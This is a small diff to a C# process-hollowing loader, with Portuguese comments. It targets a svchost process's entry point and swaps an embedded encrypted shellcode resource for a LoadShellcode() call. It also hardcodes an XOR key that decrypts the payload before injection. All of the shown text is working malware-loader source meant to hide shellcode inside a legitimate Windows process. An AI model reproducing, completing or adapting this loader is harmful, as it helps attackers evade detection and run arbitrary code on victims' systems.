@@ -99,7 +99,8 @@ namespace Hollow
             IntPtr entryPointAddr = (IntPtr)(entryPointRVA + (Int64)svchostBase);
 
             // 4. Preparar Shellcode (XOR)
-            byte[] encryptedData = HollowSyscal.Properties.Resources.shellcode_enc;
+            //byte[] encryptedData = HollowSyscal.Properties.Resources.shellcode_enc;
+            byte[] encryptedData = LoadShellcode();
             byte[] key = Encoding.ASCII.GetBytes("HFDG*febMXL@uX8YkkPhJof*");
             byte[] buf = DecryptXOR(encryptedData, key);
             Console.WriteLine("[*] DEBUG: Tamanho do shellcode: " + buf.Length);
